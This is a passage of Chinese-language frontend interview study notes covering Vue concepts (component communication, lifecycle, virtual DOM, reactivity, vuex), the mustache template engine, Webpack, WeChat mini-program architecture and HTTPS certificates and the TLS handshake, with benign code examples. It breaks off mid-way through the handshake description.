3. `$children`和`$parent`（前者获取当前组件的父组件，后者获取当前组件的子组件）

4. `$attrs`和`$listeners`
   
   ```js
   // 子组件：并未在props中声明foo  
   <p>{{$attrs.foo}}</p>  
   
   // 父组件
   <HelloWorld foo="foo"/>  
   ```

5. vuex状态管理

6. eventBus 兄弟组件数据传递（这种情况下可以使用事件总线的方式）

7. provide / inject（父组件中通过 provide 来提供变量，然后在子组件中通过 inject 来注入变量。官方不推荐在实际业务中使用，但是写组件库时很常用）

[vue组件通信方式](https://segmentfault.com/a/1190000019208626)

[面试官：Vue组件之间的通信方式都有哪些？ | web前端面试 - 面试官系列](https://vue3js.cn/interview/vue/communication.html#%E4%B8%89%E3%80%81%E7%BB%84%E4%BB%B6%E9%97%B4%E9%80%9A%E4%BF%A1%E7%9A%84%E6%96%B9%E6%A1%88)

## v-if 和 v-show 的区别

**v-if** 是**真正**的条件渲染，因为它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建；也是**惰性的**。

**v-show** 就简单得多，不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 的 “display” 属性进行切换。

> 使用场景

v-if 适用于在运行时很少改变条件，不需要频繁切换条件的场景

v-show 适用于需要非常频繁切换条件的场景

> <mark>扩展补充：display:none、visibility:hidden 和 opacity:0 之间的区别？</mark>

三者共同点都是隐藏。

不同点：

1. 是否占据空间
   
   `display:none`：隐藏后不占据位置
   
   `visibility:hidden` 和 `opacity:0`：隐藏后仍然占据位置

2. 子元素是否继承
   
   `display:none`：不会被子元素继承，父元素都不存在了，子元素也不会显示出来
   
   `visibility:hidden`：会被子元素继承，通过设置子元素 `visibility:visible` 来显示子元素
   
   `opacity:0`：会被子元素继承，但是不能通过设置子元素 `opacity:1` 来重新显示

3. 事件绑定
   
   `display:none`：元素都已经不在页面中存在，因此无法触及它绑定的事件
   
   `visibility:hidden`：不会触发它上面绑定的事件
   
   `opacity:0`：可以触发它上面绑定的事件

4. 过渡动画（`transition属性`）
   
   `display:none`：对于它无效
   
   `visibility:hidden`：对于它无效
   
   `opacity:0`：对于它有效

## keep-alive实现缓存组件

将需要频繁变更的组件放置在标签`keep-alive`中进行缓存,这样频繁的组件就不会被销毁然后重新渲染.

参考: https://www.bilibili.com/video/BV1fX4y1G7iT?p=17

## 怎么理解Vue的单向数据流

数据总是从父组件传到子组件，子组件没有权利修改父组件传过来的数据，只能请求父组件对原始数据进行修改。这样会防止从子组件意外改变父级组件的状态，从而导致你的应用的数据流向难以理解。

> 注意：在子组件直接用 v-model 绑定父组件传过来的 prop 这样是不规范的写法 开发环境会报警告

## computed 和 watch 的区别和运用的场景

computed 是计算属性，依赖其他属性计算值，并且 computed 的值有缓存，只有当计算值变化才会返回内容，它可以设置 getter 和 setter。

watch 监听到值的变化就会执行回调，在回调中可以进行一些逻辑操作。

计算属性一般用在模板渲染中，某个值是依赖了其它的响应式对象甚至是计算属性计算而来；而侦听属性适用于观测某个值的变化去完成一段复杂的业务逻辑

## v-if 与 v-for 为什么不建议一起使用

同一个标签中如果同时使用这两个，那么会先解析`v-for`再解析`v-if`！

如果遇到需要同时使用时，可以考虑写成计算属性的方式。

## Vue 的生命周期方法有哪些 一般在哪一步发请求

**beforeCreate** 在实例初始化之后，数据观测(data observer) 和 event/watcher 事件配置之前被调用。在当前阶段 data、methods、computed 以及 watch 上的数据和方法都不能被访问

**created** 实例已经创建完成之后被调用。在这一步，实例已完成以下的配置：数据观测(data observer)，属性和方法的运算， watch/event 事件回调。这里没有$el,如果非要想与 Dom 进行交互，可以通过 vm.$nextTick 来访问 Dom

**beforeMount** 在挂载开始之前被调用：相关的 render 函数首次被调用。

**mounted** 在挂载完成后发生，在当前阶段，真实的 Dom 挂载完毕，数据完成双向绑定，可以访问到 Dom 节点

**beforeUpdate** 数据更新时调用，发生在虚拟 DOM 重新渲染和打补丁（patch）之前。可以在这个钩子中进一步地更改状态，这不会触发附加的重渲染过程

**updated** 发生在更新完成之后，当前阶段组件 Dom 已完成更新。要注意的是避免在此期间更改数据，因为这可能会导致无限循环的更新，该钩子在服务器端渲染期间不被调用。

**beforeDestroy** 实例销毁之前调用。在这一步，实例仍然完全可用。我们可以在这时进行善后收尾工作，比如清除计时器。

**destroyed** Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。 该钩子在服务器端渲染期间不被调用。

**activated** keep-alive 专属，组件被激活时调用

**deactivated** keep-alive 专属，组件被销毁时调用

> 异步请求在哪一步发起？

可以在钩子函数 created、beforeMount、mounted 中进行异步请求，因为在这三个钩子函数中，data 已经创建，可以将服务端端返回的数据进行赋值。

如果异步请求不需要依赖 Dom 推荐在 created 钩子函数中调用异步请求，因为在 created 钩子函数中调用异步请求有以下优点：

- 能更快获取到服务端数据，减少页面 loading 时间；
- ssr 不支持 beforeMount 、mounted 钩子函数，所以放在 created 中有助于一致性；

## 虚拟 DOM 是什么 有什么优缺点

由于在浏览器中操作 DOM 是很昂贵的。频繁的操作 DOM，会产生一定的性能问题。这就是虚拟 Dom 的产生原因。Vue2 的 Virtual DOM 借鉴了开源库 snabbdom 的实现。

<mark>Virtual DOM 本质就是用一个原生的 JS 对象去描述一个 DOM 节点，</mark><mark>是对真实 DOM 的一层抽象。</mark>

**优点：**

1. 保证性能下限： 框架的虚拟 DOM 需要适配任何上层 API 可能产生的操作，它的一些 DOM 操作的实现必须是普适的，所以它的性能并不是最优的；但是比起粗暴的 DOM 操作性能要好很多，因此框架的虚拟 DOM 至少可以保证在你不需要手动优化的情况下，依然可以提供还不错的性能，即保证性能的下限；

2. 无需手动操作 DOM： 我们不再需要手动去操作 DOM，只需要写好 View-Model 的代码逻辑，框架会根据虚拟 DOM 和 数据双向绑定，帮我们以可预期的方式更新视图，极大提高我们的开发效率；

3. 跨平台： 虚拟 DOM 本质上是 JavaScript 对象,而 DOM 与平台强相关，相比之下虚拟 DOM 可以进行更方便地跨平台操作，例如服务器渲染、weex 开发等等。

**缺点:**

1. 无法进行极致优化： 虽然虚拟 DOM + 合理的优化，足以应对绝大部分应用的性能需求，但在一些性能要求极高的应用中虚拟 DOM 无法进行针对性的极致优化。

2. 首次渲染大量 DOM 时，由于多了一层虚拟 DOM 的计算，会比 innerHTML 插入慢。

## v-model 原理

v-model 只是语法糖而已

v-model 在内部为不同的输入元素使用不同的 property 并抛出不同的事件：

- text 和 textarea 元素使用 value property 和 input 事件；
- checkbox 和 radio 使用 checked property 和 change 事件；
- select 字段将 value 作为 prop 并将 change 作为事件。

> 注意:对于需要使用输入法 (如中文、日文、韩文等) 的语言，你会发现 v-model 不会在输入法组合文字过程中得到更新。

在普通标签上

```javascript
    <input v-model="sth" />  //这一行等于下一行
    <input v-bind:value="sth" v-on:input="sth = $event.target.value" />
复制代码
```

在组件上

```html
<currency-input v-model="price"></currentcy-input>
<!--上行代码是下行的语法糖 <currency-input :value="price" @input="price = arguments[0]"></currency-input>-->

<!-- 子组件定义 -->
Vue.component('currency-input', {
 template: `
  <span>
   <input
    ref="input"
    :value="value"
    @input="$emit('input', $event.target.value)"
   >
  </span>
 `,
 props: ['value'],
})
```

## v-for 为什么要加 key

key 是为 Vue 中 vnode 的唯一标记，通过这个 key，我们的 diff 操作可以更准确、更快速。Vue 的 diff 过程可以概括为：oldCh 和 newCh 各有两个头尾的变量 oldStartIndex、oldEndIndex 和 newStartIndex、newEndIndex，它们会新节点和旧节点会进行两两对比，即一共有4种比较方式：新前旧前 、新后旧后 、newStartIndex 和 oldEndIndex 、newEndIndex 和 oldStartIndex，如果以上 4 种比较都没匹配，如果设置了key，就会用 key 再进行比较，在比较的过程中，遍历会往中间靠，一旦 StartIdx > EndIdx 表明 oldCh 和 newCh 至少有一个已经遍历完了，就会结束比较。具体有无 key 的 diff 过程，可以查看作者写的另一篇详解虚拟 DOM 的文章《[深入剖析：Vue核心之虚拟DOM](https://juejin.cn/post/6844903895467032589#heading-14 "https://juejin.cn/post/6844903895467032589#heading-14")》

**所以 Vue 中 key 的作用是：key 是为 Vue 中 vnode 的唯一标记，通过这个 key，我们的 diff 操作可以更准确、更快速**

**更准确**：因为带 key 就不是就地复用了，在 sameNode 函数 `a.key === b.key` 对比中可以避免就地复用的情况。所以会更加准确。

**更快速**：利用 key 的唯一性生成 map 对象来获取对应节点，比遍历方式更快，源码如下：

```js
function createKeyToOldIdx (children, beginIdx, endIdx) {
  let i, key
  const map = {}
  for (i = beginIdx; i <= endIdx; ++i) {
    key = children[i].key
    if (isDef(key)) map[key] = i
  }
  return map
}
```

## 为什么不建议用index做key?

同上一个问题, 也是因为在进行虚拟节点的对比时, 如果是用index作为key, 那么新增的那个在头顶的元素的 key 为0, 这样进行 diff 四命中比较的时候, 会由于前三次都是新前与旧前命中, 最后将新节点中剩余的节点(该节点本来就在原来旧的节点的最后一个)添加到旧节点中,导致原来不用更新的节点也被更新, 降低效率.

具体过程可自己模拟

参考: [15张图，20分钟吃透Diff算法核心原理，我说的！！！ - 掘金](https://juejin.cn/post/6994959998283907102#heading-10)

## vue-router 动态路由是什么 有什么问题

我们经常需要把某种模式匹配到的所有路由，全都映射到同个组件。例如，我们有一个 User 组件，对于所有 ID 各不相同的用户，都要使用这个组件来渲染。那么，我们可以在 vue-router 的路由路径中使用“动态路径参数”(dynamic segment) 来达到这个效果：

```js
const User = {
  template: "<div>User</div>",
};

const router = new VueRouter({
  routes: [
    // 动态路径参数 以冒号开头
    { path: "/user/:id", component: User },
  ],
});
```

> 问题:vue-router 组件复用导致路由参数失效怎么办？

解决方法：

1.通过 watch 监听路由参数再发请求

```javascript
watch: { //通过watch来监听路由变化

 "$route": function(){
     this.getData(this.$route.params.xxx);
 }
}
```

2.用 :key 来阻止“复用”

```html
<router-view :key="$route.fullPath" />
```

## 谈一下对 vuex 的个人理解

vuex 是专门为 vue 提供的全局状态管理系统，用于多个组件中数据共享、数据缓存等。（无法持久化、内部核心原理是通过创造一个全局实例 new Vue）

![vuex.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/cb545e2edc0a4dcb94a412db0625799c~tplv-k3u1fbpfcp-watermark.awebp)

主要包括以下几个模块：

- State：定义了应用状态的数据结构，可以在这里设置默认的初始状态。
- Getter：允许组件从 Store 中获取数据，mapGetters 辅助函数仅仅是将 store 中的 getter 映射到局部计算属性。
- Mutation：是唯一更改 store 中状态的方法，且必须是同步函数。
- Action：用于提交 mutation，而不是直接变更状态，可以包含任意异步操作。
- Module：允许将单一的 Store 拆分为多个 store 且同时保存在单一的状态树中。

## Vuex 页面刷新数据丢失怎么解决

需要做 vuex 数据持久化，一般使用本地存储的方案来保存数据，可以自己设计存储方案，也可以使用第三方插件

推荐使用 vuex-persist 插件，它就是为 Vuex 持久化存储而生的一个插件。不需要你手动存取 storage ，而是直接将状态保存至 cookie 或者 localStorage 中

## Vuex 为什么要分模块并且加命名空间

**模块**:由于使用单一状态树，应用的所有状态会集中到一个比较大的对象。当应用变得非常复杂时，store 对象就有可能变得相当臃肿。为了解决以上问题，Vuex 允许我们将 store 分割成模块（module）。每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块。

**命名空间**：默认情况下，模块内部的 action、mutation 和 getter 是注册在全局命名空间的——这样使得多个模块能够对同一 mutation 或 action 作出响应。如果希望你的模块具有更高的封装度和复用性，你可以通过添加 namespaced: true 的方式使其成为带命名空间的模块。当模块被注册后，它的所有 getter、action 及 mutation 都会自动根据模块注册的路径调整命名。

## vue 中使用了哪些设计模式

1.工厂模式 - 传入参数即可创建实例

虚拟 DOM 根据参数的不同返回基础标签的 Vnode 和组件 Vnode

2.单例模式 - 整个程序有且仅有一个实例

vuex 和 vue-router 的插件注册方法 install 判断如果系统存在实例就直接返回掉

3.发布-订阅模式 (vue 事件机制)

4.观察者模式 (响应式数据原理)

5.装饰模式: (@装饰器的用法)

6.策略模式 策略模式指对象有某个行为,但是在不同的场景中,该行为有不同的实现方案-比如选项的合并策略

## **<mark>Vue源码探究系列</mark>**

### mustache模版引擎

#### 什么是模版引擎

定义：解决数据到视图的最优雅的方法

> 历史上出现过的数据 -> 视图的方法

1. 纯DOM法（渲染速度快于第二种的字符串渲染）

2. 数组join法（利于书写查看）
   
   ```html
   <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta http-equiv="X-UA-Compatible" content="IE=edge">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Document</title>
   </head>
   <body>
       <ul id="list">
       </ul>
   
       <script>
           var arr = [
               {"name": "小明", "age": 12, "sex": "男"},
               {"name": "小红", "age": 22, "sex": "女"},
               {"name": "小亮", "age": 32, "sex": "男"},
           ];
   
           let list = document.querySelector("#list");
   
           for(let i = 0; i < arr.length; i++) {
               list.innerHTML += [
                   '<li>', 
                       '<div class="hd">' + arr[i].name +'的信息</div>', 
                       '<div class="bd">', 
                           '<p>姓名：' + arr[i].name + '</p>', 
                           '<p>年龄：' + arr[i].age + '</p>', 
                           '<p>性别：' + arr[i].sex + '</p>', 
                       '</div>', 
                   '</li>'
               ].join('');
           }
       </script>
   </body>
   </html>
   ```

3. ES6的反引号法（使用模版字符串即可）
   
   ```js
           list.innerHTML += `
                   <li>
                       <div class="hd">${arr[i].name}的信息</div> 
                       <div class="bd">
                           <p>姓名：${arr[i].name}</p>
                           <p>年龄：${arr[i].age}</p> 
                           <p>性别：${arr[i].sex}</p> 
                       </div>
                   </li>
           `;
   ```

4. **模版引擎**

#### mustache的基本使用

这里的代码，同步更新到`Github`上：[GitHub - lizhuang-zhi/VueSourceExploration: 探究学习Vue源码](https://github.com/lizhuang-zhi/VueSourceExploration)

#### 使用正则表达式模拟实现数据填充

这里的代码，同步更新到`Github`上：[GitHub - lizhuang-zhi/VueSourceExploration: 探究学习Vue源码](https://github.com/lizhuang-zhi/VueSourceExploration)

#### mustache库的机理

> 利用tokens

![](https://tva1.sinaimg.cn/large/008i3skNgy1gyot4gz70hj313y0hy75h.jpg)

<mark>编译</mark>：模版字符串 => tokens数组

1. `parseTemplateToTokens.js`：将模版字符串 => 单层级的tokens数组（这个过程会用到`Scanner.js`扫描类）
   
   ![](https://tva1.sinaimg.cn/large/008i3skNgy1gytr8zapn0j30dt09pq39.jpg)
   
   转变为
   
   ![](https://tva1.sinaimg.cn/large/008i3skNgy1gytr9ivmt6j30jb0a3t9x.jpg)

2. `nestTokens.js`：将单层级的tokens数组 => 嵌套的tokens数组
   
   最终变为
   
   ![](https://tva1.sinaimg.cn/large/008i3skNgy1gytrdawq3ij30ax03kwem.jpg)
   
   ![](https://tva1.sinaimg.cn/large/008i3skNgy1gytrcv9buzj30bi0a7gmi.jpg)
   
   ![](https://tva1.sinaimg.cn/large/008i3skNgy1gytrikz4tlj30c60fnq45.jpg)
   
   ![](https://tva1.sinaimg.cn/large/008i3skNgy1gytrkrmwi2j30cl0fqq4b.jpg)

<mark>解析</mark>：tokens数组 + data数据 => dom字符串

1. `renderTemplate.js`：分情况讨论tokens数组中将会遇到的不同类型（'text'、'name'、'#'）
   
   1. ‘text‘：直接拼接
   
   2. 'name'：判断是否存在点（是否是洋葱型属性），然后拼接
   
   3. '#'：碰到#，说明又是一个数组，递归遍历即可

这里的代码，同步更新到`Github`上：[GitHub - lizhuang-zhi/VueSourceExploration: 探究学习Vue源码/Mustache机理](https://github.com/lizhuang-zhi/VueSourceExploration/tree/main/SGG_TemplateEngine)

### **虚拟DOM和diff算法**

虚拟DOM在Vue中主要做的事：

1. 提供与真实DOM节点所对应的虚拟节点

2. 将虚拟节点vnode和旧虚拟节点oldVnode进行比对，然后更新视图

> 虚拟dom(vue和react都在使用)比原生dom快在哪里?
>     首先明确vue和react并没有优化dom操作。vue和react做了以下两点:
> 
> * 减少dom操作(将需要进行多次操作dom，整理为最后一次)
> * 虚拟dom借助dom diff，省掉多余操作，做到最小量更新

![](https://tva1.sinaimg.cn/large/008i3skNly1gyx97f8b1zj310r0u041z.jpg)

更多图片内容：[ProcessOn上有源码流程以及关于diff算法的步骤展示](https://www.processon.com/diagraming/6169645563768921fa246af3)

这里的代码，同步更新到`Github`上：[模拟实现snabbdom](https://github.com/lizhuang-zhi/VueSourceExploration/blob/main/%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/mySnabbdom.js)

### 数据响应式原理

> 非侵入式和侵入式

![](https://tva1.sinaimg.cn/large/008i3skNgy1gz65ou9hi8j311p0scq6f.jpg)

#### 初识`Object.defineProperty()`

为对象添加的属性添加`get`与`set`方法，这样就可以在`set`中做其他操作（重写数据等...）

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <script>
    const per = {};
    let age = 20;

    // 给per对象添加一个具有set和get的age属性
    Object.defineProperty(per, 'age', {
      get: function() {
        return age;
      },
      set: function(value) {
        // 监听数据变化
        console.log('数据变化');  
        /*
           重新渲染
         */
        age = value;
      }
    })

    console.log(per.age);  // 20
    per.age = 123;   // 触发set方法：数据变化
    console.log(per.age);  // 123

  </script>
</body>
</html>
```

#### 基本的响应式实现

```js
let data = {
    name: 'leo',
    age: 20
}

function observer(target) {
    if(typeof target !== 'object' || target === null) {
        return target;
    }

    for(let key in target) {
        defineReactive(target, key, target[key]);
    }
}

function defineReactive(target, key, value) {
    Object.defineProperty(target, key, {
        get() {
            return value;
        },
        set(newValue) {
            if(newValue !== value) {
                value = newValue;
                console.log('视图更新');
            }
        }
    })
}

/*
   为data对象的属性添加get与set方法
   作用：这样可以监听数据变化，并且可再操作等
 */
observer(data);

console.log(data);  // 打印结果如下
```

如果不执行`observer(data)`，打印如下

```js
{name: 'leo', age: 20}
```

#### 处理值为复杂对象情况

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>处理值为复杂对象情况</title>
</head>
<body>

  <h1>Vue响应式</h1>

  <script>

    let data = {
      name: 'leo',
      age: 20,
      // 需要深度观察的属性（1）
      skill: {
        work: 'code'
      }
    }

    function observer(target) {
      if(typeof target !== 'object' || target === null) {
        return target;
      }

      for(let key in target) {
        defineReactive(target, key, target[key]);
      }
    }

    function defineReactive(target, key, value) {
      /* 
        如果遍历的属性又是一个引用类型
        进行深度观察（1）
      */
      observer(value);

      Object.defineProperty(target, key, {
        get() {
          return value;
        },
        set(newValue) {
          //（2）
          observer(newValue);

          if(newValue !== value) {
            value = newValue;
            console.log('视图更新');
          }
        }
      })
    }

    observer(data);

    // 需要深度监听的属性（1）
    data.skill.work = 'player';

    // 被修改属性为引用属性时，深度观察修改值（2）
    data.name = { number: 77 };
    data.name.number = 23;

    /* 
      当我们添加或者删除属性时，
      只能分别使用 Vue.delete 和 Vue.set 来观察数据更新
    */
    delete data.age;
    data.test = '新加的属性';

  </script>

</body>
</html>
```

`(1)`和`(2)`是对应要点

#### 处理值为数组的情况

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>处理值为复杂对象情况</title>
</head>
<body>

  <h1>Vue响应式</h1>

  <script>

    let data = {
      name: 'leo',
      age: 20,
      skill: {
        work: 'code'
      },
      // 数组
      colors: ['red', 'orange', 'green']
    }

    /*
      为数组方法添加响应（重写数组原型的方法）
    */
    let oldArrayProto = Array.prototype;
    let newArray = Object.create(oldArrayProto);
    ['push', 'pop', 'unshift', 'shift', 'splice'].forEach(item => {
      newArray[item] = function() { 
        oldArrayProto[item].call(this, ...arguments);
        console.log('视图更新');
      }
    })

    function observer(target) {
      if(typeof target !== 'object' || target === null) {
        return target;
      }

      // 添加部分！
      if(Array.isArray(target)) {
        target.__proto__ = newArray;
      }

      for(let key in target) {
        defineReactive(target, key, target[key]);
      }
    }

    function defineReactive(target, key, value) {
      /* 
        如果遍历的属性又是一个引用类型
        进行深度观察
      */
      observer(value);

      Object.defineProperty(target, key, {
        get() {
          return value;
        },
        set(newValue) {
          observer(newValue);

          if(newValue !== value) {
            value = newValue;
            console.log('视图更新');
          }
        }
      })
    }

    observer(data);

    // data.colors[0] = 'yellow';   // 本来就会打印：视图更新
    data.colors.push('white');   // 添加代码后：视图更新
  </script>

</body>
</html>
```

### AST抽象语法树

![](https://tva1.sinaimg.cn/large/008i3skNgy1gzb53xny7fj31dp0u0tbd.jpg)

![](https://tva1.sinaimg.cn/large/008i3skNgy1gzb558n02rj31j60u0n1h.jpg)

> **抽象语法树和虚拟节点有什么关系**

![](https://tva1.sinaimg.cn/large/008i3skNgy1gzb5lv21h9j31hs0u0tcr.jpg)

这里的代码，同步更新到`Github`上：[模拟实现AST](https://github.com/lizhuang-zhi/VueSourceExploration/tree/main/study-ast)

# Webpack

## 为什么使用Webpack

1. 解决多个JS文件合并后的作用域问题

2. 解决单文件太大问题

3. 解决文件可读性问题

4. 解决可维护性差问题

## 那你再说一说Loader和Plugin的区别？

- wepack只能解析JS/JSON, 不能解析CSS、img这样的内容, 所以使用Loader这个翻译官

对其进行解析. 所以Loader本质是一个函数, 用于帮助webpack对其他资源进行转译和预处理

- 而Plugin作为webpack的插件, 添加扩展webpack功能, 在webpack的整个生命周期中, 监听各种广播事件, 并在合适的时候做出操作, 改变输出结果

- Loader在module.rules中配置, 作为模块的解析规则, 类型为数组, 数组中的每一个元素都是对象包含了test、options、loader、use等属性

- 而Plugin在plugins中单独配置, 类型也是数组, 每一项都是一个Plugin实例, 参数通过构造函数传入

## Webpack构建流程简单说一下

简单说

1. 初始化: 启动构建、读取与合并配置参数, 加载Plugin, 实例Compiler

2. 编译: 从Entry出发, 针对每个Modul串行调用对应Loader翻译文件内容, 再找到Module对应的Module, 递归进行编译处理.

3. 输出: 将编译的Module组合成Chunk, 将Chunk转化成文件, 添加到文件系统

具体过程参考: [「吐血整理」再来一打Webpack面试题 - 掘金](https://juejin.cn/post/6844904094281236487#heading-3)

# 微信小程序

## 小程序的原理？小程序如何与微信客户端（Native）进行交互的？

### 双线程选型

小程序的渲染层和逻辑层分别由2个线程管理：渲染层的界面使用了 WebView 进行渲染；逻辑层采用 JsCore 线程运行JS脚本。 Native 代指微信客户端

![](https://tva1.sinaimg.cn/large/008i3skNly1gxsogozrrej314h0u0tcd.jpg)

### 数据驱动

> WXML结构实际上等价于一棵Dom树，通过一个JS对象也可以来表达Dom树的结构

![](https://tva1.sinaimg.cn/large/008i3skNgy1gzekd1kcfyj30wq0o9dh4.jpg)

> 小程序渲染页面

把WXML和对应的data数据 => JS对象 => DOM树（渲染展示出来）

![](https://tva1.sinaimg.cn/large/008i3skNgy1gzekdjfwdtj30wq0do0tf.jpg)

### 双线程下的界面渲染

> 小程序的数据更新

![](https://tva1.sinaimg.cn/large/008i3skNgy1gzekbz12nqj31560oc0vb.jpg)

小程序的逻辑层和渲染层是分开的两个线程。在渲染层，宿主环境会把 WXML 转化成相应的 JS 对象，在逻辑层发生数据变更的时候，通过宿主环境提供的 setData 方法将数据从逻辑层传递到渲染层，再经过对比前后差异，把差异应用在原来的 DOM 树上，进而渲染出正确的 UI 界面，如下图所示。其实就是采用了虚拟 DOM 的思想。

![](https://tva1.sinaimg.cn/large/008i3skNly1gxspgr9ucsj30wq0n4diu.jpg)

具体详细步骤（官网的例子很好，<mark>一定要看！</mark>）：[教程 | 《小程序开发指南》](https://developers.weixin.qq.com/ebook?action=get_post_info&docid=0000286f908988db00866b85f5640a)

### 小程序与客户端通信原理

#### 视图层组件

内置组件中有部分组件是利用到客户端原生提供的能力，这类组件基本都是前一个章节描述的原生组件。既然需要客户端原生提供的能力，那就会涉及到视图层与客户端的交互通信。这层通信机制在 iOS 和安卓系统的实现方式并不一样，**iOS 是利用了WKWebView 的提供 messageHandlers 特性，而在安卓则是往 WebView 的 window 对象注入一个原生方法，最终会封装成 WeiXinJSBridge 这样一个兼容层，主要提供了调用（invoke）和监听（on）这两种方法。**

实际上，在视图层与客户端的交互通信中，开发者只是间接调用的，真正调用是在组件的内部实现中。开发者插入一个原生组件，一般而言，组件运行的时候被插入到 DOM 树中，会调用客户端接口，通知客户端在哪个位置渲染一块原生界面。在后续开发者更新组件属性时，同样地，也会调用客户端提供的更新接口来更新原生界面的某些部分。

#### 逻辑层接口

逻辑层与客户端原生通信机制与渲染层类似，不同在于，iOS平台可以往JavaScripCore框架注入一个全局的原生方法，而安卓方面则是跟渲染层一致的。

同样地，开发者也是间接地调用到与客户端原生通信的底层接口。一般我们会对逻辑层接口做层封装后才暴露给开发者，封装的细节可能是统一入参、做些参数校验、兼容各平台或版本问题等等。

## 小程序和Web的区别

1. 安全可控，沙箱隔离，限制 DOM 和 BOM 能力
   
   * 不允许跳转至其他网页；
   
   * 不允许直接操作 DOM；
   
   * 不允许随意使用 window 上的某些未知的可能有危险的 API；

2. 性能
   
   * 在浏览器网页中，虽然 JS 执行和 UI 渲染也是处于两个线程，但是 JS 线程和 UI 线程是互斥的（之所以设计为互斥的主要是 JS 可以操作 DOM，所以必须设计为互斥的才能避免二者的不同步问题）；
   
   * 在小程序中，逻辑层和渲染层是独立的，二者不会互相阻塞，因此性能更优（小程序限制了 JS 操作 DOM 的能力，因此不用担心二者的不同步问题）；

# HTTP

## 说一下`HTTP`和`HTTPS`

> `http`和`https`的基本概念

`HTTP`: 超文本传输协议，是互联网上应用最为广泛的一种网络协议，是一个客户端和服务器端请求和应答的标准（**基于TCP**），用于从WWW服务器传输超文本到本地浏览器的传输协议，它可以使浏览器更加高效，使网络传输减少。

`HTTPS`: 是以安全为目标的HTTP通道，简单讲是HTTP的安全版，即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。

`HTTPS`协议的主要作用是：建立一个信息安全通道，来确保数组的传输，确保网站的真实性。

> `http`和`https`的区别？

`http`传输的数据都是未加密的，也就是明文的，网景公司设置了`SSL`协议来对`http`协议传输的数据进行加密处理，简单来说`https`协议是由`http`和`ssl`协议构建的可进行**加密传输**和**身份认证**的网络协议，比`http`协议的安全性更高。

主要区别：

1. HTTPS协议需要`CA`证书，费用较高
2. HTTP是超文本传输协议，信息是明文传输，而HTTPS是带有SSL加密传输的，更加安全
3. 二者使用不同的链接方式，端口也不同，一般HTTP协议是80端口，HTTPS是443端口
4. HTTP连接简单，无状态；HTTPS需要有一个**SSL的加密认证过程，更为复杂，服务器处理时间会更长**

> CA机构颁布数字证书（公钥证书）详细过程

关于CA机构颁布数字证书（公钥证书）的详情：

![](https://tva1.sinaimg.cn/large/e6c9d24egy1gznevjng5yj20ux0msdjh.jpg)

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h0k390cydlj21c80qqgp4.jpg)

CA 签发证书的过程，如上图左边部分：

* ⾸先 CA 会把持有者的公钥、⽤途、颁发者、有效时间等信息打成⼀个包，然后对这些信息进⾏ Hash 计算，得到⼀个 Hash 值；

* 然后 CA 会使⽤⾃⼰的私钥将该 Hash 值加密，⽣成 Certificate Signature，也就是 CA 对证书做了签名；

* 最后将 Certificate Signature 添加在⽂件证书上，形成数字证书；

客户端校验服务端的数字证书的过程，如上图右边部分：

* ⾸先客户端会使⽤同样的 Hash 算法获取该证书的 Hash 值 H1；

* 通常浏览器和操作系统中集成了 CA 的公钥信息，浏览器收到证书后可以使⽤ CA 的公钥解密 Certificate Signature 内容，得到⼀个 Hash 值 H2 ；

* 最后⽐较 H1 和 H2，如果值相同，则为可信赖的证书，否则则认为证书不可信。

> `https`协议的优点

1. 使用HTTPS协议可**认证用户和服务器，确保数据发送到正确的客户机和服务器**；

2. HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，要比HTTP协议**安全**，可防止数据在传输过程中不被窃取、改变，**确保数据的完整性**

3. HTTPS是现行架构下最安全的解决方案，虽然不是绝对安全，但它大幅增加了中间人攻击的成本
* 总结：
  1. 保证数据的**安全和完整性** 
  2. 可认证用户与服务器，**保证数据的传递正确性**

> `https`协议的缺点

1. HTTPS握手阶段比较费时，会使页面加载时间延长50%，增加10%~20%的耗电。
2. SSL证书也需要钱，功能越强大的证书费用越高。
3. HTTPS连接服务器端资源占用高，相同负载下会增加带宽和服务器投入成本;
4. HTTPS缓存不如HTTP高效，会增加数据开销。
5. SSL证书通常需要绑定固定IP，为服务器增加固定IP会增加一定费用;

总结：**费时（客户端页面加载）、费钱、费性能（服务端资源占用）**

## https工作原理的详细介绍 (CA认证在前一个知识点)

SSL/TLS 协议基本流程：

* 客户端向服务器索要并验证服务器的公钥。

* 双⽅协商⽣产「会话秘钥」。

* 双⽅采⽤「会话秘钥」进⾏加密通信。

前两步也就是 SSL/TLS 的建⽴过程，也就是握⼿阶段。

SSL/TLS 的「握⼿阶段」涉及四次通信，可⻅下图：

![](https://tva1.sinaimg.cn/large/e6c9d24egy1gzpnjpvuy4j20u01iin13.jpg)

*1. ClientHello*

首先，由客户端向服务器发起加密通信请求，也就是 `ClientHello` 请求。

在这一步，客户端主要向服务器发送以下信息：

（1）客户端支持的 SSL/TLS 协议版本，如 TLS 1.2 版本。

（2）客户端生产的随机数（`Client Random`），后面用于生产「会话秘钥」。

（3）客户端支持的密码套件列表，如 RSA 加密算法。

*2. SeverHello*

服务器收到客户端请求后，向客户端发出响应，也就是 `SeverHello`。服务器回应的内容有如下内容：

（1）确认 SSL/ TLS 协议版本，如果浏览器不支持，则关闭加密通信。

（2）服务器生产的随机数（`Server Random`），后面用于生产「会话秘钥」。

（3）确认的密码套件列表，如 RSA 加密算法。

（4）服务器的数字证书。

*3.客户端回应*

